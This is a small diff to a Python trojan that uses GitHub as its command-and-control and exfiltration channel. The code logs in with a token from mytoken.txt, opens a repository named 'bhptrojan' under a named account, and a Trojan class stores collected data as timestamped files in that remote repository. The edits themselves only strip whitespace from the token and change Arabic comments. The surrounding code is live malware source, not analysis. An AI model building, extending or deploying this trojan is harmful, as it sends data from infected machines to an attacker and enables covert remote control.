@@ -8,11 +8,10 @@ import threading
 import time
 from datetime import datetime
 
-# استبدل هذا بمحتوى ملف الرمز الخاص بك أو تأكد من وجود ملف mytoken.txt
 def github_connect():
     with open('mytoken.txt') as f:
-        token = f.read()
-    user = 'alakhas997-droid'  # تأكد من أن اسم المستخدم صحيح
+        token = f.read().strip()  # استخدام strip لإزالة المسافات والأسطر الجديدة
+    user = 'alakhas997-droid'     # تأكد من اسم المستخدم الخاص بك هنا
     sess = github3.login(token=token)
     return sess.repository(user, 'bhptrojan')
 
@@ -46,7 +45,6 @@ class Trojan:
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         
-        # تحويل البيانات إلى نص مشفر إذا لم تكن كذلك
         if isinstance(data, bytes):
             bindata = data
         else:
